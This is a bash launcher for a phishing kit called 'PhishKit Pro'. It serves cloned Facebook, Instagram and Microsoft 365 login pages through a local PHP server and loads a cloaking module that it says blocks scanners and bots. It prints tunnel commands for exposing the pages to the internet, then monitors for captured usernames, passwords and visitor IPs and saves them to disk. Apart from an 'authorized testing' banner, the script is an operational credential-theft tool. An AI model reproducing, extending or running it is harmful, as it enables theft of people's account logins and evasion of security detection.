#!/bin/bash

# PhishKit Pro — Evasion-Enhanced Phishing Framework
# For Authorized Security Testing Only

RED='\033[1;31m'; GREEN='\033[1;32m'; BLUE='\033[1;34m'
YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; NC='\033[0m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    clear
    echo -e "${RED}"
    echo "  ____  _     _     _    _ _ _   _ "
    echo " |  _ \| |__ (_)___| | _(_) | |_| |"
    echo " | |_) | '_ \| / __| |/ / | | __| |"
    echo " |  __/| | | | \__ \   <| | | |_|_|"
    echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
    echo -e "${NC}"
    echo -e "${CYAN}  PhishKit Pro v3.1 — Anti-Detection Framework${NC}"
    echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
    echo ""
}

list_templates() {
    echo -e "${BLUE}[+] Available Templates:${NC}\n"
    local i=1
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        # Show a description
        case "$name" in
            facebook)   desc="Facebook login page" ;;
            instagram)  desc="Instagram login page" ;;
            microsoft)  desc="Microsoft 365 login page" ;;
            generic)    desc="Generic branded login page" ;;
            *)          desc="Custom template" ;;
        esac
        echo -e "  ${GREEN}$i)${NC} ${WHITE}$name${NC} — $desc"
        i=$((i+1))
    done
    echo ""
}

setup_site() {
    local site_name="$1"
    local site_dir="$BASE_DIR/.sites/$site_name"
    local www_dir="$BASE_DIR/.server/www"
    
    # Clean and prepare www directory
    mkdir -p "$www_dir"
    rm -rf "$www_dir"/*
    
    echo -e "${BLUE}[+] Setting up: ${WHITE}$site_name${NC}"
    
    # ===== COPY ALL template directories into www =====
    # We copy ALL templates so the router can switch between them
    for dir in "$BASE_DIR/.sites"/*/; do
        dirname=$(basename "$dir")
        [[ "$dirname" == _* ]] && continue
        cp -r "$dir" "$www_dir/"
    done
    
    # ===== COPY router.php to www root =====
    if [[ -f "$BASE_DIR/.sites/router.php" ]]; then
        cp "$BASE_DIR/.sites/router.php" "$www_dir/router.php"
        echo -e "${GREEN}[+] Router script loaded${NC}"
    fi
    
    # ===== COPY _cloak.php to www root =====
    if [[ -f "$BASE_DIR/.sites/_cloak.php" ]]; then
        cp "$BASE_DIR/.sites/_cloak.php" "$www_dir/_cloak.php"
        echo -e "${GREEN}[+] Cloaking module loaded${NC}"
    fi
    
    # ===== COPY ip.php to each template directory =====
    if [[ -f "$BASE_DIR/.sites/ip.php" ]]; then
        for dir in "$www_dir"/*/; do
            cp "$BASE_DIR/.sites/ip.php" "$dir/"
        done
    fi
    
    # ===== FIX: Update include paths in index.php files =====
    # After copying, the structure is:
    #   .server/www/_cloak.php
    #   .server/www/facebook/index.php
    # So from facebook/index.php, ../_cloak.php works correctly
    for dir in "$www_dir"/*/; do
        local index_file="$dir/index.php"
        if [[ -f "$index_file" ]]; then
            # Remove any complex path logic and replace with simple relative path
            sed -i 's|__DIR__ . '"'"'/../../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
            sed -i 's|__DIR__ . '"'"'/../../.sites/_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
            sed -i 's|__DIR__ . '"'"'/../_cloak.php'"'"'|__DIR__ . '"'"'/../_cloak.php'"'"'|g' "$index_file"
        fi
    done
    
    # ===== FIX: Update cache.php to use correct paths =====
    local cache_file="$www_dir/$site_name/cache.php"
    if [[ -f "$cache_file" ]]; then
        # cache.php reads login.html from the same directory, which works
        :
    fi
    
    # ===== START PHP SERVER with router =====
    echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
    echo -e "${BLUE}[+] Document root: ${WHITE}$www_dir${NC}"
    
    # Use the router.php if it exists
    if [[ -f "$www_dir/router.php" ]]; then
        cd "$www_dir" && php -S "$HOST:$PORT" router.php > /dev/null 2>&1 &
        echo -e "${GREEN}[+] Router-based server started${NC}"
    else
        cd "$www_dir" && php -S "$HOST:$PORT" > /dev/null 2>&1 &
    fi
    
    local pid=$!
    sleep 1.5
    
    if kill -0 $pid 2>/dev/null; then
        echo -e "${GREEN}[+] Server running at: http://$HOST:$PORT/${NC}"
        echo -e "${GREEN}[+] Template URL: http://$HOST:$PORT/$site_name/${NC}"
        echo -e "${YELLOW}[!] The router will redirect / to /$site_name/${NC}"
    else
        echo -e "${RED}[-] Failed to start PHP server.${NC}"
        echo -e "${YELLOW}[!] Try: apt install php -y${NC}"
        exit 1
    fi
    
    # Save the selected site name for monitoring
    echo "$site_name" > "$www_dir/.active_site"
}

tunnel_options() {
    local site_name="$1"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Tunnel Options (for external access)${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 1 — Serveo (no install needed):${NC}"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT serveo.net${NC}"
    echo -e "     ${GREEN}URL: https://yourname.serveo.net/$site_name/${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 2 — Ngrok:${NC}"
    echo -e "     ${WHITE}ngrok http $PORT${NC}"
    echo -e "     ${GREEN}URL: https://xxxx.ngrok.io/$site_name/${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 3 — Cloudflared:${NC}"
    echo -e "     ${WHITE}cloudflared tunnel --url http://localhost:$PORT${NC}"
    echo -e "     ${GREEN}URL: https://xxxx.trycloudflare.com/$site_name/${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 4 — Localhost.run:${NC}"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT nokey@localhost.run${NC}"
    echo ""
}

monitor() {
    local site_name="$1"
    local www_dir="$BASE_DIR/.server/www"
    local auth_dir="$BASE_DIR/auth"
    local site_data_dir="$www_dir/$site_name"
    
    mkdir -p "$auth_dir"
    
    echo -e "${YELLOW}[*] Monitoring for credentials... (Ctrl+C to stop)${NC}"
    echo -e "${YELLOW}[*] Data directory: ${WHITE}$site_data_dir${NC}"
    echo -e "${YELLOW}[*] Persistent storage: ${WHITE}$auth_dir/${NC}\n"
    
    # Track file modification times
    local last_cred_mod=0
    local last_ip_mod=0
    local cred_file="$site_data_dir/usernames.txt"
    local ip_file="$site_data_dir/ip.txt"
    
    while true; do
        # Check credentials
        if [[ -f "$cred_file" ]]; then
            local current_mod=$(stat -c %Y "$cred_file" 2>/dev/null || echo 0)
            if (( current_mod > last_cred_mod )); then
                echo -e "${RED}┌──────────────────────────────────────────┐${NC}"
                echo -e "${RED}│${GREEN}        CREDENTIALS CAPTURED!             ${RED}│${NC}"
                echo -e "${RED}└──────────────────────────────────────────┘${NC}"
                cat "$cred_file"
                cp "$cred_file" "$auth_dir/credentials_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
                cp "$cred_file" "$auth_dir/latest_credentials.txt" 2>/dev/null
                last_cred_mod=$current_mod
                echo ""
            fi
        fi
        
        # Check IP log
        if [[ -f "$ip_file" ]]; then
            local current_ip_mod=$(stat -c %Y "$ip_file" 2>/dev/null || echo 0)
            if (( current_ip_mod > last_ip_mod )); then
                # New IP logged
                last_ip_mod=$current_ip_mod
                tail -1 "$ip_file" >> "$auth_dir/visitors.log" 2>/dev/null
            fi
        fi
        
        sleep 1
    done
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    rm -rf "$BASE_DIR/.server"
    echo -e "${GREEN}[+] Done.${NC}"
    exit 0
}

main() {
    banner
    list_templates
    
    echo -ne "${CYAN}[?] Select template number: ${NC}"
    read choice
    
    local i=1
    local selected=""
    for site in "$BASE_DIR/.sites"/*/; do
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        if [[ $i -eq $choice ]]; then
            selected="$name"
            break
        fi
        i=$((i+1))
    done
    
    if [[ -z "$selected" ]]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi
    
    trap cleanup EXIT INT TERM
    
    setup_site "$selected"
    tunnel_options "$selected"
    
    echo ""
    echo -e "${GREEN}[+] Share this URL: http://$HOST:$PORT/$selected/${NC}"
    echo -e "${YELLOW}[!] The cloaking layer blocks scanners & bots${NC}"
    echo -e "${YELLOW}[!] Real users see the login page after verification${NC}"
    echo ""
    echo -ne "${CYAN}[?] Press Enter to start monitoring...${NC}"
    read
    
    monitor "$selected"
}

main